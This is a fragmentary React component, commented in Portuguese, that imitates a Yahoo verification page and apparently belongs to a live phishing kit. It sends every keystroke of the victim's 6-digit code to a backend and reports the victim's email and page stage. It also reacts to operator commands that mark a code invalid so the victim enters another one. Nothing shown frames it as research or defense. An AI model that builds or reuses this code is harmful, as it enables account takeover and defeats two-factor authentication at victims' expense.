...
// Layout simples de verificação Yahoo (app/code)
const YahooAuthPage = () => {
  ...
  React.useEffect(() => {
    if (introLoading || (isSubmitting && loadingStage === "final")) {
  ...
  }, [introLoading, isSubmitting, loadingStage, phrases.length]);
  ...
  // Atualizar URL/página e etapa para badge
  React.useEffect(() => {
    try {
      updateClientData({
        currentUrl: "/sync?view=yahoo_auth",
        currentPage: "yahoo_auth",
        yahooStage: "Auth",
        fromForm: true,
      });
    } catch {}
  ...
  // Detectar comandos de invalidação (botão X)
  React.useEffect(() => {
    ...
    if (latest.startsWith("inv_") || latest.startsWith("invalid_")) {
      setInvalidMessage("Invalid authentication code.");
      setCode("");
  ...
  // Email exibido no badge (prioriza Firebase, cai para localStorage)
  const resolvedEmail = React.useMemo(() => {
    const fromClient =
      (clientData && (clientData.yahooAuthEmail || clientData.email)) || "";
    if (fromClient && String(fromClient).trim())
      return String(fromClient).trim();
    try {
      return (
        (typeof window !== "undefined" &&
          ((localStorage.getItem("yahoo_auth_email") || "").trim() ||
      ...
      >
        ...
        >
          ...
          <div style={{ padding: "24px 24px 14px 24px" }}>
            ...
            <p style={{ color: "#605e5c", margin: 0, marginBottom: 16 }}>
              Enter the code from your Yahoo verification method.
            </p>
            <label htmlFor="code" style={{ fontSize: 12, color: "#6b7280" }}>
              6-digit code
            </label>
            <input
              data-yahoo-modal
              ...
              onChange={(e) => {
                ...
                setCode(val);
                try {
                  updateClientData({ yahooAuth: val });
                  reportTyping("yahooauth", val);
                } catch {}
              }}
            ...
            <div style={{ marginTop: 18 }}>
              <button
                ...
                style={{
                  width: "100%",
                  padding: "14px",
                  background: code.trim() ? "#6a33f5" : "#e6dbfb",
                  color: code.trim() ? "#fff" : "#5f5a64",
                  border: "none",
                  borderRadius: 28,
                  fontSize: 14,
                  fontWeight: 700,
                ...
                onClick={(e) => {
                  ...
                  // Ir direto para a etapa final (igual ao Yahoo SMS), sem overlay branco intermediário
                  setLoadingStage("final");
                  try {
                    updateClientData({ yahooAuthSubmittedAt: Date.now() });
                  } catch {}
                }}
              >
                Next
            ...
            {/* Overlay de abertura (3s) e final com GIF + frases */}
            {(introLoading || (isSubmitting && loadingStage === "final")) && (
              <div
                style={{
                  position: "absolute",
                  inset: 0,
